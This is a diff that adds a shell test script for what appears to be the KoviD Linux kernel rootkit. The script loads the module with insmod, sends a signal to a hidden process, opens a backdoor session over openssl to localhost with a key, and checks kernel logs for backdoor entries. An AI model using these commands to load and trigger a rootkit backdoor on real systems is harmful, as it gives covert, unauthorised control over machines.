@@ -1,0 +1,46 @@
+# REQUIRES: 0
+# REQUIRES: DEBUG_ONLY
+# REQUIRES: NATIVE_TESTS
+#
+# RUN: bash %s > %t.log
+# RUN: FileCheck-18 --input-file=%t.log %s
+
+TEST_COUNT=3
+MODULE_PATH="../../../build/kovid.ko"
+
+# Clear dmesg so we only see new logs
+sudo dmesg -c >/dev/null 2>&1
+
+for i in $(seq 1 $TEST_COUNT); do
+  echo "=== Iteration $i ==="
+  
+  # Insert the module
+  sudo insmod "$MODULE_PATH"
+  kill -CONT 31337
+  sudo timeout 10 ../../../scripts/bdclient.sh openssl localhost 9999 0x7d3b1cb572f16425
+  sleep 1
+
+  echo list-backdoor > /proc/myprocname
+  
+  # Grab dmesg output for backdoor printing
+  NEW_LINES=$(dmesg | grep "back-door: " || true)
+  echo "BackdoorLogLines: ${NEW_LINES}"
+  
+  # Check that at least one line has the expected format:
+  if echo "$NEW_LINES" | grep -Eq "back-door: saddr ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) : sport [0-9]+ : daddr ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) : dport [0-9]+"; then
+    echo "Found a valid backdoor log."
+  else
+    echo "ERROR: Could not find a valid backdoor log."
+    exit 1
+  fi
+  
+  # Remove the module
+  sudo rmmod kovid
+  sleep 1
+done
+
+sudo dmesg
+
+# CHECK: Found a valid backdoor log.
+# CHECK: Found a valid backdoor log.
+# CHECK: Found a valid backdoor log.
